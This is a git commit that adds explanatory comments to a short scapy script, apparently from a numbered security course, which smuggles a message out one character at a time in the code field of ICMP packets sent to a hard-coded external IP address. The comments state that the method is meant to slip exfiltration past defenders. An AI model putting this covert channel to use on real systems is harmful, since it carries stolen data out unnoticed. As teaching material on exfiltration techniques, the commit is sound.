bb1c8eed7a02969df6d06c2f868d690643f5722d
Ian Pokres <80968123+ianp89@users.noreply.github.com>
2024-07-19 15:25:02 -0400

    Commented on NonApplicationClient.py to explain functionality.

--- Part_13/13.2_Non-Application_Layer_Protocol/NonApplicationClient.py
+++ Part_13/13.2_Non-Application_Layer_Protocol/NonApplicationClient.py
@@ -1,4 +1,14 @@
+# This script performs data exfil via ICMP, which would be useful in a case where the data to transfer is quite small.
+# Normally, application-layer protocols are used for exfil, so defenders would be less likely to look here, but ICMP packets are normally small!
+
 from scapy.all import *
+
+# def transmit(message, host):
+#    for m in message:
+#        mac = get_if_hwaddr(conf.iface)
+#        packet = Ether(src=mac,dst=mac)/IP(dst=host)/ICMP(code = ord(m))
+#        sendp(packet,verbose=False)
+# Example how to execute on local host. See 13.1 for reasoning.
 
 def transmit(message, host):
     for m in message:
@@ -6,5 +16,6 @@ def transmit(message, host):
         send(packet)
 
 host = "3.20.135.129"
+# Just an example!
 message = "Hello"
 transmit(message,host)
